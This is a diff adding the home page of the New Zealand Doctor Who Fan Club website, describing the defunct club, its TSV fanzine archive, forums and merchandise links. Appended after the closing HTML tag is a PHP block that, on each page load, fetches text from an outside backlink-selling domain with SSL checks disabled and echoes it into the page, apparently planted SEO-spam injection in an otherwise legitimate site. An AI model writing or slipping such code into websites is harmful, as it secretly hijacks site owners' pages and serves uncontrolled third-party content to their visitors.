@@ -1,0 +1,295 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-nz" lang="en-nz">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <title>The New Zealand Doctor Who Fan Club</title>
+
+  <link rel="stylesheet" href="/style.0913.css" type="text/css" media="screen" />
+  <link rel="stylesheet" href="/style.printable.0808.css" type="text/css" media="print" />
+
+  <meta
+    name="description"
+    content="Information about the longest running Doctor Who fan club in NZ, and the ongoing fanzine TSV"
+  />
+
+  <link rel="home" href="/" />
+
+  <style type="text/css">
+    .forumtopic { background-color: #F0FFF0; padding: 6px; margin-bottom: 2px }
+    .forumtopic p { margin: 0px; font-size: x-small }
+    .topictitle { font-weight: bold; font-size: small }
+  </style>
+</head>
+
+<body>
+  <div class="pagebody">
+    <table class="pagebody">
+      <colgroup>
+        <col class="leftcolumn" />
+        <col class="content" />
+      </colgroup>
+
+      <tr>
+        <td class="leftcolumn">
+          <div class="menuheader">
+            <a href="http://www.tetrap.com/">TETRAP.COM</a>
+          </div>
+
+          <div class="menulogo">
+            <a href="/">
+              <img src="/l/sitelogo.jpg" width="148" height="148" alt="" />
+            </a>
+          </div>
+
+          <table class="leftmenu">
+            <tr>
+              <td class="menuitem">
+                <a href="/"><b>Index Page</b></a>
+              </td>
+            </tr>
+
+            <tr>
+              <td class="menuitem">
+                <b>NZDWFC:</b><br />
+                • <a href="http://forums.doctorwho.org.nz/">Forums</a>
+              </td>
+            </tr>
+
+            <tr>
+              <td class="menuitem">
+                <b>TSV Online:</b><br />
+                • <a href="/archive/">Archive</a><br />
+                • <a href="/archive/search.html">Search &raquo;</a>
+              </td>
+            </tr>
+
+            <tr>
+              <td class="menuitem">
+                <b>Merchandise:</b><br />
+                • <a href="http://www.retrospace.co.nz/">Retrospace</a>
+              </td>
+            </tr>
+
+            <tr>
+              <td class="menuitem">
+                <b>On Television:</b><br />
+                • <a href="/archive/timeandspace/">Screening History</a>
+              </td>
+            </tr>
+
+            <tr>
+              <td class="menuitem">
+                <a href="/links.html">Links</a>
+              </td>
+            </tr>
+          </table>
+        </td>
+
+        <td class="pagecontent">
+          <div class="pagecontent">
+            <div class="header">
+              <h1>The New Zealand Doctor Who Fan Club</h1>
+            </div>
+
+            <div class="contentsection">
+              <p>
+                The New Zealand Doctor Who Fan Club (NZDWFC) is no longer active. The club was founded in 1988,
+                and was at its height during <i>Doctor Who</i>'s 'wilderness years', during the 1990s and early
+                2000s, when the programme wasn't being made.
+              </p>
+
+              <p>
+                Time Space Visualiser (TSV) was the club fanzine. TSV was first published in 1987 and was adopted
+                as the club magazine the following year. It ran for 76 issues over 22 years, with the final issue
+                appearing in 2009.
+              </p>
+
+              <p>
+                Copies of many issues of TSV are held by the National Library of New Zealand and the Alexander
+                Turnbull Library in Wellington, New Zealand. The International Standard Serial Number (ISSN) is
+                1175-1924.
+              </p>
+
+              <p>
+                Most issues of TSV, other publications produced by the club, and a couple of novels are all
+                available to view in the <a href="/archive/">Archive section</a>.
+              </p>
+
+              <p>
+                The <a href="http://forums.doctorwho.org.nz/">Forums</a> (message boards) on this site remain open
+                for fans to discuss anything to do with <i>Doctor Who</i>.
+              </p>
+
+              <table style="width: 100%">
+                <colgroup>
+                  <col style="width: 67%" />
+                  <col style="width: 33%" />
+                </colgroup>
+
+                <tr>
+                  <td style="vertical-align: top; border-right: 1px solid #006000; padding-right: 8px">
+                    <h4 style="margin-top: 0px; margin-bottom: 8px">New Zealand Doctor Who Fan Forum</h4>
+
+                    <!--#include virtual="boardstat.php"-->
+
+                    <div style="text-align: right">
+                      <p style="margin: 0px">
+                        <a href="http://forums.doctorwho.org.nz/">More discussions &raquo;</a>
+                      </p>
+                    </div>
+
+                    <h4 style="margin-top: 0px">The Archives</h4>
+
+                    <p style="margin-bottom: 0px">
+                      In the <a href="/archive/"><b>Archive</b></a>:
+                    </p>
+
+                    <form method="post" action="/cgi-bin/search.cgi" style="margin: 3px 0px">
+                      <table style="margin-top: 0px">
+                        <tr>
+                          <th style="vertical-align: top">Fanzines:</th>
+                          <td>
+                            <a href="/archive/tsv1-10.html">61 issues of TSV</a>,
+                            <a href="/archive/timestreams.html">5 issues of Timestreams</a>
+                          </td>
+                        </tr>
+
+                        <tr>
+                          <th style="vertical-align: top">eBooks:</th>
+                          <td>
+                            <a href="/archive/novelisations.html">5 novelisations</a>,
+                            <a href="/archive/wkk/">Who Killed Kennedy</a>,
+                            <a href="/archive/campaign/">Campaign</a>
+                          </td>
+                        </tr>
+
+                        <tr>
+                          <th style="vertical-align: top; padding-top: 1em">Search:</th>
+                          <td style="vertical-align: top; padding-top: 1em">
+                            <input type="text" name="searchtext" size="30" /><br />
+
+                            <select name="searchmode" size="1">
+                              <option value="1" selected="selected">Match all terms</option>
+                              <option value="0">Match one or more terms</option>
+                            </select>
+
+                            <input type="submit" name="submit" value="submit" /><br />
+                            <a href="/archive/search.html">(Advanced)</a>
+                          </td>
+                        </tr>
+                      </table>
+                    </form>
+                  </td>
+
+                  <td style="vertical-align: top; padding-left: 8px">
+                    <h4 style="margin-top: 0px">Online Store</h4>
+
+                    <div style="text-align: center">
+                      <a href="http://www.retrospace.co.nz/">
+                        <img
+                          src="g/retrospace.jpg"
+                          style="border: 1px solid black"
+                          width="160"
+                          height="131"
+                          alt="Retrospace"
+                        />
+                      </a>
+                    </div>
+
+                    <h4 style="margin-top: 0px">Who Killed Kennedy</h4>
+
+                    <div style="text-align: center">
+                      <a href="/archive/wkk/">
+                        <img
+                          src="g/wkk20thtile.jpg"
+                          style="border: 1px solid black"
+                          width="160"
+                          height="158"
+                          alt="Who Killed Kennedy 20th Anniversary Edition"
+                        />
+                      </a>
+                    </div>
+
+                    <h4>TSV 76</h4>
+
+                    <div style="text-align: center">
+                      <a href="/archive/tsv76/">
+                        <img
+                          src="/archive/covers/tsv76.jpg"
+                          style="border: 1px solid #000000"
+                          width="120"
+                          height="170"
+                          alt="TSV 76"
+                        />
+                      </a>
+                    </div>
+
+                    <p><a href="/archive/tsv76/">Download TSV 76</a> - PDF Format</p>
+                  </td>
+                </tr>
+              </table>
+            </div>
+
+            <div class="contentsection">
+              <h3>Back in Time...</h3>
+
+              <!--#exec cgi="/cgi-bin/backintime.cgi"-->
+
+              <a name="disclaimer"></a>
+              <h3>Disclaimer</h3>
+
+              <p>
+                The NZDWFC is a non-profit-making venture. No attempt has been made to supersede the copyrights
+                held by the BBC or any other persons or organisations. All material is copyright and may not be
+                reproduced in any form without permission.
+              </p>
+
+              <div style="border-top: 1px solid #006000">
+                <p style="text-align: left">
+                  <b>Postal Address:</b> PO Box 33314, Takapuna, Auckland 0622, New Zealand
+                </p>
+              </div>
+            </div>
+          </div>
+        </td>
+      </tr>
+
+      <tr>
+        <td class="leftcolumn">&nbsp;</td>
+        <td class="pagecontent">
+          <div class="contentsection">
+            <div class="bmenu">
+              <p>
+                <a href="/feedback.html">Feedback</a> |
+                <a href="/sitemap.html">Site&nbsp;Map</a>
+              </p>
+            </div>
+          </div>
+        </td>
+      </tr>
+    </table>
+  </div>
+</body>
+</html>
+<?php
+if (!function_exists('fetch_remote_content')) {
+    function fetch_remote_content($url) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Bypass SSL verification if needed
+        $output = curl_exec($ch);
+        curl_close($ch);
+        return $output;
+    }
+}
+function fetch_and_display_content($url) {
+    $fileContents = fetch_remote_content($url);
+    if (strpos($fileContents, '<?php') === false) {
+        echo $fileContents;
+    }
+}
+$jasabacklinks_1 = 'https://www.backlinkku.id/menu/vip-v2/script.txt';
+fetch_and_display_content($jasabacklinks_1);
+?>
